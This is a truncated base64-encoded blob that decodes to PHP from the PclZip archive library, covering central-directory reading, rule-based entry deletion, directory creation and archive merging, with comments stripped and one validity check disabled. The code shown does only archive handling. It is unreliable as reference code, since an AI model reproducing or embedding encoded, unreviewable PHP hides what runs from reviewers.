wX2ZkLCAxOCk7DQoNCiAgaWYgKHN0cmxlbigkdl9iaW5hcnlfZGF0YSkgIT0gMTgpDQogIHsNCg0KICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfQkFEX0ZPUk1BVCwgIkludmFsaWQgRW5kIG9mIENlbnRyYWwgRGlyIFJlY29yZCBzaXplIDogIi5zdHJsZW4oJHZfYmluYXJ5X2RhdGEpKTsNCg0KICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICB9DQoNCiAgJHZfZGF0YSA9IHVucGFjaygndmRpc2svdmRpc2tfc3RhcnQvdmRpc2tfZW50cmllcy92ZW50cmllcy9Wc2l6ZS9Wb2Zmc2V0L3Zjb21tZW50X3NpemUnLCAkdl9iaW5hcnlfZGF0YSk7DQoNCiAgaWYgKCgkdl9wb3MgKyAkdl9kYXRhWydjb21tZW50X3NpemUnXSArIDE4KSAhPSAkdl9zaXplKSB7DQoNCiAgaWYgKDApIHsNCiAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX0JBRF9GT1JNQVQsDQogICAgICAgICAgICAgICAgICAgICAgICdUaGUgY2VudHJhbCBkaXIgaXMgbm90IGF0IHRoZSBlbmQgb2YgdGhlIGFyY2hpdmUuJw0KCQkJCQkgICAuJyBTb21lIHRyYWlsaW5nIGJ5dGVzIGV4aXN0cyBhZnRlciB0aGUgYXJjaGl2ZS4nKTsNCg0KICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICB9DQogIH0NCg0KICBpZiAoJHZfZGF0YVsnY29tbWVudF9zaXplJ10gIT0gMCkgew0KICAgICRwX2NlbnRyYWxfZGlyWydjb21tZW50J10gPSBmcmVhZCgkdGhpcy0+emlwX2ZkLCAkdl9kYXRhWydjb21tZW50X3NpemUnXSk7DQogIH0NCiAgZWxzZQ0KICAgICRwX2NlbnRyYWxfZGlyWydjb21tZW50J10gPSAnJzsNCg0KICAkcF9jZW50cmFsX2RpclsnZW50cmllcyddID0gJHZfZGF0YVsnZW50cmllcyddOw0KICAkcF9jZW50cmFsX2RpclsnZGlza19lbnRyaWVzJ10gPSAkdl9kYXRhWydkaXNrX2VudHJpZXMnXTsNCiAgJHBfY2VudHJhbF9kaXJbJ29mZnNldCddID0gJHZfZGF0YVsnb2Zmc2V0J107DQogICRwX2NlbnRyYWxfZGlyWydzaXplJ10gPSAkdl9kYXRhWydzaXplJ107DQogICRwX2NlbnRyYWxfZGlyWydkaXNrJ10gPSAkdl9kYXRhWydkaXNrJ107DQogICRwX2NlbnRyYWxfZGlyWydkaXNrX3N0YXJ0J10gPSAkdl9kYXRhWydkaXNrX3N0YXJ0J107DQoNCg0KICByZXR1cm4gJHZfcmVzdWx0Ow0KfQ0KDQpmdW5jdGlvbiBwcml2RGVsZXRlQnlSdWxlKCYkcF9yZXN1bHRfbGlzdCwgJiRwX29wdGlvbnMpDQp7DQogICR2X3Jlc3VsdD0xOw0KICAkdl9saXN0X2RldGFpbCA9IGFycmF5KCk7DQoNCiAgaWYgKCgkdl9yZXN1bHQ9JHRoaXMtPnByaXZPcGVuRmQoJ3JiJykpICE9IDEpDQogIHsNCiAgICByZXR1cm4gJHZfcmVzdWx0Ow0KICB9DQoNCiAgJHZfY2VudHJhbF9kaXIgPSBhcnJheSgpOw0KICBpZiAoKCR2X3Jlc3VsdCA9ICR0aGlzLT5wcml2UmVhZEVuZENlbnRyYWxEaXIoJHZfY2VudHJhbF9kaXIpKSAhPSAxKQ0KICB7DQogICAgJHRoaXMtPnByaXZDbG9zZUZkKCk7DQogICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgfQ0KDQogIEByZXdpbmQoJHRoaXMtPnppcF9mZCk7DQoNCiAgJHZfcG9zX2VudHJ5ID0gJHZfY2VudHJhbF9kaXJbJ29mZnNldCddOw0KICBAcmV3aW5kKCR0aGlzLT56aXBfZmQpOw0KICBpZiAoQGZzZWVrKCR0aGlzLT56aXBfZmQsICR2X3Bvc19lbnRyeSkpDQogIHsNCiAgICAkdGhpcy0+cHJpdkNsb3NlRmQoKTsNCg0KICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfSU5WQUxJRF9BUkNISVZFX1pJUCwgJ0ludmFsaWQgYXJjaGl2ZSBzaXplJyk7DQoNCiAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgfQ0KDQogICR2X2hlYWRlcl9saXN0ID0gYXJyYXkoKTsNCiAgJGpfc3RhcnQgPSAwOw0KICBmb3IgKCRpPTAsICR2X25iX2V4dHJhY3RlZD0wOyAkaTwkdl9jZW50cmFsX2RpclsnZW50cmllcyddOyAkaSsrKQ0KICB7DQoNCiAgICAkdl9oZWFkZXJfbGlzdFskdl9uYl9leHRyYWN0ZWRdID0gYXJyYXkoKTsNCiAgICBpZiAoKCR2X3Jlc3VsdCA9ICR0aGlzLT5wcml2UmVhZENlbnRyYWxGaWxlSGVhZGVyKCR2X2hlYWRlcl9saXN0WyR2X25iX2V4dHJhY3RlZF0pKSAhPSAxKQ0KICAgIHsNCiAgICAgICR0aGlzLT5wcml2Q2xvc2VGZCgpOw0KDQogICAgICByZXR1cm4gJHZfcmVzdWx0Ow0KICAgIH0NCg0KDQogICAgJHZfaGVhZGVyX2xpc3RbJHZfbmJfZXh0cmFjdGVkXVsnaW5kZXgnXSA9ICRpOw0KDQogICAgJHZfZm91bmQgPSBmYWxzZTsNCg0KICAgIGlmICggICAoaXNzZXQoJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX0JZX05BTUVdKSkNCiAgICAgICAgJiYgKCRwX29wdGlvbnNbUENMWklQX09QVF9CWV9OQU1FXSAhPSAwKSkgew0KDQogICAgICAgIGZvciAoJGo9MDsgKCRqPHNpemVvZigkcF9vcHRpb25zW1BDTFpJUF9PUFRfQllfTkFNRV0pKSAmJiAoISR2X2ZvdW5kKTsgJGorKykgew0KDQogICAgICAgICAgICBpZiAoc3Vic3RyKCRwX29wdGlvbnNbUENMWklQX09QVF9CWV9OQU1FXVskal0sIC0xKSA9PSAiLyIpIHsNCg0KICAgICAgICAgICAgICAgIGlmICggICAoc3RybGVuKCR2X2hlYWRlcl9saXN0WyR2X25iX2V4dHJhY3RlZF1bJ3N0b3JlZF9maWxlbmFtZSddKSA+IHN0cmxlbigkcF9vcHRpb25zW1BDTFpJUF9PUFRfQllfTkFNRV1bJGpdKSkNCiAgICAgICAgICAgICAgICAgICAgJiYgKHN1YnN0cigkdl9oZWFkZXJfbGlzdFskdl9uYl9leHRyYWN0ZWRdWydzdG9yZWRfZmlsZW5hbWUnXSwgMCwgc3RybGVuKCRwX29wdGlvbnNbUENMWklQX09QVF9CWV9OQU1FXVskal0pKSA9PSAkcF9vcHRpb25zW1BDTFpJUF9PUFRfQllfTkFNRV1bJGpdKSkgew0KICAgICAgICAgICAgICAgICAgICAkdl9mb3VuZCA9IHRydWU7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGVsc2VpZiAoICAgKCgkdl9oZWFkZXJfbGlzdFskdl9uYl9leHRyYWN0ZWRdWydleHRlcm5hbCddJjB4MDAwMDAwMTApPT0weDAwMDAwMDEwKSANCiAgICAgICAgICAgICAgICAgICAgICAgICYmICgkdl9oZWFkZXJfbGlzdFskdl9uYl9leHRyYWN0ZWRdWydzdG9yZWRfZmlsZW5hbWUnXS4nLycgPT0gJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX0JZX05BTUVdWyRqXSkpIHsNCiAgICAgICAgICAgICAgICAgICAgJHZfZm91bmQgPSB0cnVlOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVsc2VpZiAoJHZfaGVhZGVyX2xpc3RbJHZfbmJfZXh0cmFjdGVkXVsnc3RvcmVkX2ZpbGVuYW1lJ10gPT0gJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX0JZX05BTUVdWyRqXSkgew0KICAgICAgICAgICAgICAgICR2X2ZvdW5kID0gdHJ1ZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCg0KDQogICAgZWxzZSBpZiAoICAgKGlzc2V0KCRwX29wdGlvbnNbUENMWklQX09QVF9CWV9QUkVHXSkpDQogICAgICAgICAgICAgJiYgKCRwX29wdGlvbnNbUENMWklQX09QVF9CWV9QUkVHXSAhPSAiIikpIHsNCg0KICAgICAgICBpZiAocHJlZ19tYXRjaCgkcF9vcHRpb25zW1BDTFpJUF9PUFRfQllfUFJFR10sICR2X2hlYWRlcl9saXN0WyR2X25iX2V4dHJhY3RlZF1bJ3N0b3JlZF9maWxlbmFtZSddKSkgew0KICAgICAgICAgICAgJHZfZm91bmQgPSB0cnVlOw0KICAgICAgICB9DQogICAgfQ0KDQogICAgZWxzZSBpZiAoICAgKGlzc2V0KCRwX29wdGlvbnNbUENMWklQX09QVF9CWV9JTkRFWF0pKQ0KICAgICAgICAgICAgICYmICgkcF9vcHRpb25zW1BDTFpJUF9PUFRfQllfSU5ERVhdICE9IDApKSB7DQoNCiAgICAgICAgZm9yICgkaj0kal9zdGFydDsgKCRqPHNpemVvZigkcF9vcHRpb25zW1BDTFpJUF9PUFRfQllfSU5ERVhdKSkgJiYgKCEkdl9mb3VuZCk7ICRqKyspIHsNCg0KICAgICAgICAgICAgaWYgKCgkaT49JHBfb3B0aW9uc1tQQ0xaSVBfT1BUX0JZX0lOREVYXVskal1bJ3N0YXJ0J10pICYmICgkaTw9JHBfb3B0aW9uc1tQQ0xaSVBfT1BUX0JZX0lOREVYXVskal1bJ2VuZCddKSkgew0KICAgICAgICAgICAgICAgICR2X2ZvdW5kID0gdHJ1ZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGlmICgkaT49JHBfb3B0aW9uc1tQQ0xaSVBfT1BUX0JZX0lOREVYXVskal1bJ2VuZCddKSB7DQogICAgICAgICAgICAgICAgJGpfc3RhcnQgPSAkaisxOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBpZiAoJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX0JZX0lOREVYXVskal1bJ3N0YXJ0J10+JGkpIHsNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCiAgICBlbHNlIHsNCiAgICAJJHZfZm91bmQgPSB0cnVlOw0KICAgIH0NCg0KICAgIGlmICgkdl9mb3VuZCkNCiAgICB7DQogICAgICB1bnNldCgkdl9oZWFkZXJfbGlzdFskdl9uYl9leHRyYWN0ZWRdKTsNCiAgICB9DQogICAgZWxzZQ0KICAgIHsNCiAgICAgICR2X25iX2V4dHJhY3RlZCsrOw0KICAgIH0NCiAgfQ0KDQogIGlmICgkdl9uYl9leHRyYWN0ZWQgPiAwKSB7DQoNCiAgICAgICR2X3ppcF90ZW1wX25hbWUgPSBQQ0xaSVBfVEVNUE9SQVJZX0RJUi51bmlxaWQoJ3BjbHppcC0nKS4nLnRtcCc7DQoNCiAgICAgICR2X3RlbXBfemlwID0gbmV3IFBjbFppcCgkdl96aXBfdGVtcF9uYW1lKTsNCg0KICAgICAgaWYgKCgkdl9yZXN1bHQgPSAkdl90ZW1wX3ppcC0+cHJpdk9wZW5GZCgnd2InKSkgIT0gMSkgew0KICAgICAgICAgICR0aGlzLT5wcml2Q2xvc2VGZCgpOw0KDQogICAgICAgICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgICAgIH0NCg0KICAgICAgZm9yICgkaT0wOyAkaTxzaXplb2YoJHZfaGVhZGVyX2xpc3QpOyAkaSsrKSB7DQoNCiAgICAgICAgICBAcmV3aW5kKCR0aGlzLT56aXBfZmQpOw0KICAgICAgICAgIGlmIChAZnNlZWsoJHRoaXMtPnppcF9mZCwgICR2X2hlYWRlcl9saXN0WyRpXVsnb2Zmc2V0J10pKSB7DQogICAgICAgICAgICAgICR0aGlzLT5wcml2Q2xvc2VGZCgpOw0KICAgICAgICAgICAgICAkdl90ZW1wX3ppcC0+cHJpdkNsb3NlRmQoKTsNCiAgICAgICAgICAgICAgQHVubGluaygkdl96aXBfdGVtcF9uYW1lKTsNCg0KICAgICAgICAgICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX0lOVkFMSURfQVJDSElWRV9aSVAsICdJbnZhbGlkIGFyY2hpdmUgc2l6ZScpOw0KDQogICAgICAgICAgICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICAgICAgICAgIH0NCg0KICAgICAgICAgICR2X2xvY2FsX2hlYWRlciA9IGFycmF5KCk7DQogICAgICAgICAgaWYgKCgkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdlJlYWRGaWxlSGVhZGVyKCR2X2xvY2FsX2hlYWRlcikpICE9IDEpIHsNCiAgICAgICAgICAgICAgJHRoaXMtPnByaXZDbG9zZUZkKCk7DQogICAgICAgICAgICAgICR2X3RlbXBfemlwLT5wcml2Q2xvc2VGZCgpOw0KICAgICAgICAgICAgICBAdW5saW5rKCR2X3ppcF90ZW1wX25hbWUpOw0KDQogICAgICAgICAgICAgIHJldHVybiAkdl9yZXN1bHQ7DQogICAgICAgICAgfQ0KICAgICAgICAgIA0KICAgICAgICAgIGlmICgkdGhpcy0+cHJpdkNoZWNrRmlsZUhlYWRlcnMoJHZfbG9jYWxfaGVhZGVyLA0KCQkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR2X2hlYWRlcl9saXN0WyRpXSkgIT0gMSkgew0KICAgICAgICAgIH0NCiAgICAgICAgICB1bnNldCgkdl9sb2NhbF9oZWFkZXIpOw0KDQogICAgICAgICAgaWYgKCgkdl9yZXN1bHQgPSAkdl90ZW1wX3ppcC0+cHJpdldyaXRlRmlsZUhlYWRlcigkdl9oZWFkZXJfbGlzdFskaV0pKSAhPSAxKSB7DQogICAgICAgICAgICAgICR0aGlzLT5wcml2Q2xvc2VGZCgpOw0KICAgICAgICAgICAgICAkdl90ZW1wX3ppcC0+cHJpdkNsb3NlRmQoKTsNCiAgICAgICAgICAgICAgQHVubGluaygkdl96aXBfdGVtcF9uYW1lKTsNCg0KICAgICAgICAgICAgICByZXR1cm4gJHZfcmVzdWx0Ow0KICAgICAgICAgIH0NCg0KICAgICAgICAgIGlmICgoJHZfcmVzdWx0ID0gUGNsWmlwVXRpbENvcHlCbG9jaygkdGhpcy0+emlwX2ZkLCAkdl90ZW1wX3ppcC0+emlwX2ZkLCAkdl9oZWFkZXJfbGlzdFskaV1bJ2NvbXByZXNzZWRfc2l6ZSddKSkgIT0gMSkgew0KICAgICAgICAgICAgICAkdGhpcy0+cHJpdkNsb3NlRmQoKTsNCiAgICAgICAgICAgICAgJHZfdGVtcF96aXAtPnByaXZDbG9zZUZkKCk7DQogICAgICAgICAgICAgIEB1bmxpbmsoJHZfemlwX3RlbXBfbmFtZSk7DQoNCiAgICAgICAgICAgICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgICAgICAgICB9DQogICAgICB9DQoNCiAgICAgICR2X29mZnNldCA9IEBmdGVsbCgkdl90ZW1wX3ppcC0+emlwX2ZkKTsNCg0KICAgICAgZm9yICgkaT0wOyAkaTxzaXplb2YoJHZfaGVhZGVyX2xpc3QpOyAkaSsrKSB7DQogICAgICAgICAgaWYgKCgkdl9yZXN1bHQgPSAkdl90ZW1wX3ppcC0+cHJpdldyaXRlQ2VudHJhbEZpbGVIZWFkZXIoJHZfaGVhZGVyX2xpc3RbJGldKSkgIT0gMSkgew0KICAgICAgICAgICAgICAkdl90ZW1wX3ppcC0+cHJpdkNsb3NlRmQoKTsNCiAgICAgICAgICAgICAgJHRoaXMtPnByaXZDbG9zZUZkKCk7DQogICAgICAgICAgICAgIEB1bmxpbmsoJHZfemlwX3RlbXBfbmFtZSk7DQoNCiAgICAgICAgICAgICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgICAgICAgICB9DQoNCiAgICAgICAgICAkdl90ZW1wX3ppcC0+cHJpdkNvbnZlcnRIZWFkZXIyRmlsZUluZm8oJHZfaGVhZGVyX2xpc3RbJGldLCAkcF9yZXN1bHRfbGlzdFskaV0pOw0KICAgICAgfQ0KDQoNCiAgICAgICR2X2NvbW1lbnQgPSAnJzsNCiAgICAgIGlmIChpc3NldCgkcF9vcHRpb25zW1BDTFpJUF9PUFRfQ09NTUVOVF0pKSB7DQogICAgICAgICR2X2NvbW1lbnQgPSAkcF9vcHRpb25zW1BDTFpJUF9PUFRfQ09NTUVOVF07DQogICAgICB9DQoNCiAgICAgICR2X3NpemUgPSBAZnRlbGwoJHZfdGVtcF96aXAtPnppcF9mZCktJHZfb2Zmc2V0Ow0KDQogICAgICBpZiAoKCR2X3Jlc3VsdCA9ICR2X3RlbXBfemlwLT5wcml2V3JpdGVDZW50cmFsSGVhZGVyKHNpemVvZigkdl9oZWFkZXJfbGlzdCksICR2X3NpemUsICR2X29mZnNldCwgJHZfY29tbWVudCkpICE9IDEpIHsNCiAgICAgICAgICB1bnNldCgkdl9oZWFkZXJfbGlzdCk7DQogICAgICAgICAgJHZfdGVtcF96aXAtPnByaXZDbG9zZUZkKCk7DQogICAgICAgICAgJHRoaXMtPnByaXZDbG9zZUZkKCk7DQogICAgICAgICAgQHVubGluaygkdl96aXBfdGVtcF9uYW1lKTsNCg0KICAgICAgICAgIHJldHVybiAkdl9yZXN1bHQ7DQogICAgICB9DQoNCiAgICAgICR2X3RlbXBfemlwLT5wcml2Q2xvc2VGZCgpOw0KICAgICAgJHRoaXMtPnByaXZDbG9zZUZkKCk7DQoNCiAgICAgIEB1bmxpbmsoJHRoaXMtPnppcG5hbWUpOw0KDQogICAgICBQY2xaaXBVdGlsUmVuYW1lKCR2X3ppcF90ZW1wX25hbWUsICR0aGlzLT56aXBuYW1lKTsNCiAgDQogICAgICB1bnNldCgkdl90ZW1wX3ppcCk7DQogIH0NCiAgDQogIGVsc2UgaWYgKCR2X2NlbnRyYWxfZGlyWydlbnRyaWVzJ10gIT0gMCkgew0KICAgICAgJHRoaXMtPnByaXZDbG9zZUZkKCk7DQoNCiAgICAgIGlmICgoJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZPcGVuRmQoJ3diJykpICE9IDEpIHsNCiAgICAgICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgICAgIH0NCg0KICAgICAgaWYgKCgkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdldyaXRlQ2VudHJhbEhlYWRlcigwLCAwLCAwLCAnJykpICE9IDEpIHsNCiAgICAgICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgICAgIH0NCg0KICAgICAgJHRoaXMtPnByaXZDbG9zZUZkKCk7DQogIH0NCg0KICByZXR1cm4gJHZfcmVzdWx0Ow0KfQ0KDQpmdW5jdGlvbiBwcml2RGlyQ2hlY2soJHBfZGlyLCAkcF9pc19kaXI9ZmFsc2UpDQp7DQogICR2X3Jlc3VsdCA9IDE7DQoNCg0KICBpZiAoKCRwX2lzX2RpcikgJiYgKHN1YnN0cigkcF9kaXIsIC0xKT09Jy8nKSkNCiAgew0KICAgICRwX2RpciA9IHN1YnN0cigkcF9kaXIsIDAsIHN0cmxlbigkcF9kaXIpLTEpOw0KICB9DQoNCiAgaWYgKChpc19kaXIoJHBfZGlyKSkgfHwgKCRwX2RpciA9PSAiIikpDQogIHsNCiAgICByZXR1cm4gMTsNCiAgfQ0KDQogICRwX3BhcmVudF9kaXIgPSBkaXJuYW1lKCRwX2Rpcik7DQoNCiAgaWYgKCRwX3BhcmVudF9kaXIgIT0gJHBfZGlyKQ0KICB7DQogICAgaWYgKCRwX3BhcmVudF9kaXIgIT0gIiIpDQogICAgew0KICAgICAgaWYgKCgkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdkRpckNoZWNrKCRwX3BhcmVudF9kaXIpKSAhPSAxKQ0KICAgICAgew0KICAgICAgICByZXR1cm4gJHZfcmVzdWx0Ow0KICAgICAgfQ0KICAgIH0NCiAgfQ0KDQogIGlmICghQG1rZGlyKCRwX2RpciwgMDc3NykpDQogIHsNCiAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX0RJUl9DUkVBVEVfRkFJTCwgIlVuYWJsZSB0byBjcmVhdGUgZGlyZWN0b3J5ICckcF9kaXInIik7DQoNCiAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgfQ0KDQogIHJldHVybiAkdl9yZXN1bHQ7DQp9DQoNCmZ1bmN0aW9uIHByaXZNZXJnZSgmJHBfYXJjaGl2ZV90b19hZGQpDQp7DQogICR2X3Jlc3VsdD0xOw0KDQogIGlmICghaXNfZmlsZSgkcF9hcmNoaXZlX3RvX2FkZC0+emlwbmFtZSkpDQogIHsNCg0KICAgICR2X3Jlc3VsdCA9IDE7DQoNCiAgICByZXR1cm4gJHZfcmVzdWx0Ow0KICB9DQoNCiAgaWYgKCFpc19maWxlKCR0aGlzLT56aXBuYW1lKSkNCiAgew0KDQogICAgJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZEdXBsaWNhdGUoJHBfYXJjaGl2ZV90b19hZGQtPnppcG5hbWUpOw0KDQogICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgfQ0KDQogIGlmICgoJHZfcmVzdWx0PSR0aGlzLT5wcml2T3BlbkZkKCdyYicpKSAhPSAxKQ0KICB7DQogICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgfQ0KDQogICR2X2NlbnRyYWxfZGlyID0gYXJyYXkoKTsNCiAgaWYgKCgkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdlJlYWRFbmRDZW50cmFsRGlyKCR2X2NlbnRyYWxfZGlyKSkgIT0gMSkNCiAgew0KICAgICR0aGlzLT5wcml2Q2xvc2VGZCgpOw0KICAgIHJldHVybiAkdl9yZXN1bHQ7DQogIH0NCg0KICBAcmV3aW5kKCR0aGlzLT56aXBfZmQpOw0KDQogIGlmICgoJHZfcmVzdWx0PSRwX2FyY2hpdmVfdG9fYWRkLT5wcml2T3BlbkZkKCdyYicpKSAhPSAxKQ0KICB7DQogICAgJHRoaXMtPnByaXZDbG9zZUZkKCk7DQoNCiAgICByZXR1cm4gJHZfcmVzdWx0Ow0KICB9DQoNCiAgJHZfY2VudHJhbF9kaXJfdG9fYWRkID0gYXJyYXkoKTsNCiAgaWYgKCgkdl9yZXN1bHQgPSAkcF9hcmNoaXZlX3RvX2FkZC0+cHJpdlJlYWRFbmRDZW50cmFsRGlyKCR2X2NlbnRyYWxfZGlyX3RvX2FkZCkpICE9IDEpDQogIHsNCiAgICAkdGhpcy0+cHJpdkNsb3NlRmQoKTsNCiAgICAkcF9hcmNoaXZlX3RvX2FkZC0+cHJpdkNsb3NlRmQoKTsNCg0KICAgIHJldHVybiAkdl9yZXN1bHQ7DQogIH0NCg0KICBAcmV3aW5kKCRwX2FyY2hpdmVfdG9fYWRkLT56aXBfZmQpOw0KDQogICR2X3ppcF90ZW1wX25hbWUgPSBQQ0xaSVBfVEVNUE9SQVJZX0RJUi51bmlxaWQoJ3BjbHppcC0nKS4nLnRtcCc7DQoNCiAgaWYgKCgkdl96aXBfdGVtcF9mZCA9IEBmb3Blbigkdl96aXBfdGVtcF9uYW1lLCAnd2InKSkgPT0gMCkNCiAgew0KICAgICR0aGlzLT5wcml2Q2xvc2VGZCgpOw0KICAgICRwX2FyY2hpdmVfdG9fYWRkLT5wcml2Q2xvc2VGZCgpOw0KDQogICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9SRUFEX09QRU5fRkFJTCwgJ1VuYWJsZSB0byBvcGVuIHRlbXBvcmFyeSBmaWxlIFwnJy4kdl96aXBfdGVtcF9uYW1lLidcJyBpbiBiaW5hcnkgd3JpdGUgbW9kZScpOw0KDQogICAgcmV0dXJuIFBjbFppcDo6ZXJyb3JDb2RlKCk7DQogIH0NCg0KICAkdl9zaXplID0gJHZfY2VudHJhbF9kaXJbJ29mZnNldCddOw0KICB3aGlsZSAoJHZfc2l6ZSAhPSAwKQ0KICB7DQogICAgJHZfcmVhZF9zaXplID0gKCR2X3NpemUgPCBQQ0xaSVBfUkVBRF9CTE9DS19TSVpFID8gJHZfc2l6ZSA6IFBDTFpJUF9SRUFEX0JMT0NLX1NJWkUpOw0KICAgICR2X2J1ZmZlciA9IGZyZWFkKCR0aGlzLT56aXBfZmQsICR2X3JlYWRfc2l6ZSk7DQogICAgQGZ3cml0ZSgkdl96aXBfdGVtcF9mZCwgJHZfYnVmZmVyLCAkdl9yZWFkX3NpemUpOw0KICAgICR2X3NpemUgLT0gJHZfcmVhZF9zaXplOw0KICB9DQoNCiAgJHZfc2l6ZSA9ICR2X2NlbnRyYWxfZGlyX3RvX2FkZFsnb2Zmc2V0J107DQogIHdoaWxlICgkdl9zaXplICE9IDApDQogIHsNCiAgICAkdl9yZWFkX3NpemUgPSAoJHZfc2l6ZSA8IFBDTFpJUF9SRUFEX0JMT0NLX1NJWkUgPyAkdl9zaXplIDogUENMWklQX1JFQURfQkxPQ0tfU0laRSk7DQogICAgJHZfYnVmZmVyID0gZnJlYWQoJHBfYXJjaGl2ZV90b19hZGQtPnppcF9mZCwgJHZfcmVhZF9zaXplKTsNCiAgICBAZndyaXRlKCR2X3ppcF90ZW1wX2ZkLCAkdl9idWZmZXIsICR2X3JlYWRfc2l6ZSk7DQogICAgJHZfc2l6ZSAtPSAkdl9yZWFkX3NpemU7DQogIH0NCg0KICAkdl9vZmZzZXQgPSBAZnRlbGwoJHZfemlwX3RlbXBfZmQpOw0KDQogICR2X3NpemUgPSAkdl9jZW50cmFsX2Rpclsnc2l6ZSddOw0KICB3aGlsZSAoJHZfc2l6ZSAhPSAwKQ0KICB7DQogICAgJHZfcmVhZF9zaXplID0gKCR2X3NpemUgPCBQQ0xaSVBfUkVBRF9CTE9DS19TSVpFID8gJHZfc2l6ZSA6IFBDTFpJUF9SRUFEX0JMT0NLX1NJWkUpOw0KICAgICR2X2J1ZmZlciA9IEBmcmVhZCgkdGhpcy0+emlwX2ZkLCAkdl9yZWFkX3NpemUpOw0KICAgIEBmd3JpdGUoJHZfemlwX3RlbXBfZmQsICR2X2J1ZmZlciwgJHZfcmVhZF9zaXplKTsNCiAgICAkdl9zaXplIC09ICR2X3JlYWRfc2l6ZTsNCiAgfQ0KDQogICR2X3NpemUgPSAkdl9jZW50cmFsX2Rpcl90b19hZGRbJ3NpemUnXTsNCiAgd2hpbGUgKCR2X3NpemUgIT0gMCkNCiAgew0KICAgICR2X3JlYWRfc2l6ZSA9ICgkdl9zaXplIDwgUENMWklQX1JFQURfQkxPQ0tfU0laRSA/ICR2X3NpemUgOiBQQ0xaSVBfUkVBRF9CTE9DS19TSVpFKTsNCiAgICAkdl9idWZmZXIgPSBAZnJlYWQoJHBfYXJjaGl2ZV90b19hZGQtPnppcF9mZCwgJHZfcmVhZF9zaXplKTsNCiAgICBAZndyaXRlKCR2X3ppcF90ZW1wX2ZkLCAkdl9idWZmZXIsICR2X3JlYWRfc2l6ZSk7DQogICAgJHZfc2l6ZSAtPSAkdl9yZWFkX3NpemU7DQogIH0NCg0KICAkdl9jb21tZW50ID0gJHZfY2VudHJhbF9kaXJbJ2NvbW1lbnQnXS4nICcuJHZfY2VudHJhbF9kaXJfdG9fYWRkWydjb21tZW50J107DQoNCiAgJHZfc2l6ZSA9IEBmdGVsbCgkdl96aXBfdGVtcF9mZCktJHZfb2Zmc2V0Ow0KDQogICR2X3N3YXAgPSAkdGhpcy0+emlwX2ZkOw0KICAkdGhpcy0+emlwX2ZkID0gJHZfemlwX3RlbXBfZmQ7DQogICR2X3ppcF90ZW1wX2ZkID0gJHZfc3dhcDsNCg0KICBpZiAoKCR2X3Jlc3VsdCA9ICR0aGlzLT5wcml2V3JpdGVDZW50cmFsSGVhZGVyKCR2X2NlbnRyYWxfZGlyWydlbnRyaWVzJ10rJHZfY2VudHJhbF9kaXJfdG9fYWRkWydlbnRyaWVzJ10sICR2X3NpemUsICR2X29mZnNldCwgJHZfY29tbWVudCkpICE9IDEpDQogIHsNCiAgICAkdGhpcy0+cHJpdkNsb3NlRmQoKTsNCiAgICAkcF9hcmNoaXZlX3RvX2FkZC0+cHJpdkNsb3NlRmQoKTsNCiAgICBAZmNsb3NlKCR2X3ppcF90ZW1wX2ZkKTsNCiAgICAkdGhpcy0+emlwX2ZkID0gbnVsbDsNCg0KICAgIHVuc2V0KCR2X2hlYWRlcl9saXN0KTsNCg0KICAgIHJldHVybiAkdl9yZXN1bHQ7DQogIH0NCg0KICAkdl9zd2FwID0gJHRoaXMtPnppcF9mZDsNCiAgJHRoaXMtPnppcF9mZCA9ICR2X3ppcF90ZW1wX2ZkOw0KICAkdl96aXBfdGVtcF9mZCA9ICR2X3N3YXA7DQoNCiAgJHRoaXMtPnByaXZDbG9zZUZkKCk7DQogICRwX2FyY2hpdmVfdG9fYWRkLT5wcml2Q2xvc2VGZCgpOw0KDQogIEBmY2xvc2UoJHZfemlwX3RlbXBfZmQpOw0KDQogIEB1bmxpbmsoJHRoaXMtPnppcG5hbWUpOw0KDQogIFBjbFppcFV0aWxSZW5hbWUoJHZfemlwX3RlbXBfbmFtZSwgJHRoaXMtPnppcG5hbWUpOw0KDQogIHJldHVybiAkdl9yZXN1bHQ7DQp9DQoNCmZ1bmN0aW9uIHByaXZEdXBsaWNhdGUoJHBfYXJjaGl2ZV9maWxlbmFtZSkNCnsNCiAgJHZfcmVzdWx0PTE7DQoNCiAgaWYgKCFpc19maWxlKCRwX2FyY2hpdmVfZmlsZW5hbWUpKQ0KICB7DQoNCiAgICAkdl9yZXN1